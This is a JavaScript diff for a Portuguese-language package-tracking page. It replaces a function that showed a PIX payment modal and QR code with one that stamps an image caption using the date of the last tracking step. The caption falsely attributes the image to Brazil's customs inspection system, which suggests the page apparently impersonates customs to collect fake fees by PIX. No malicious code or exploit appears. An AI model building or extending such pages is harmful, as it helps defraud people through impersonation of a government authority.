@@ -92,13 +92,26 @@ import { Navigation } from './src/components/navigation.js';
         });
     }
     
-    function displayRealPixModal() {
-        console.log('🎯 Exibindo modal com dados reais do PIX...');
-        
-        // Atualizar caption da imagem com data/hora da última etapa
-        this.updateImageCaption();
-        
-        // Atualizar QR Code com dados reais
+    function updateImageCaption() {
+        const caption = document.getElementById('imageCaption');
+        if (caption && this.trackingData && this.trackingData.steps.length > 0) {
+            // Pegar a data da última etapa
+            const lastStep = this.trackingData.steps[this.trackingData.steps.length - 1];
+            const lastDate = new Date(lastStep.date);
+            
+            // Formatar data e hora
+            const dateStr = lastDate.toLocaleDateString('pt-BR', { 
+                day: '2-digit', 
+                month: '2-digit', 
+                year: 'numeric' 
+            });
+            const timeStr = lastDate.toLocaleTimeString('pt-BR', { 
+                hour: '2-digit', 
+                minute: '2-digit' 
+            });
+            
+            caption.textContent = `Anexado pelo sistema de capitalização da fiscalização aduaneira do Brasil ${dateStr} ${timeStr}`;
+        }
     }
     
     // Múltiplas estratégias de inicialização para garantir funcionamento
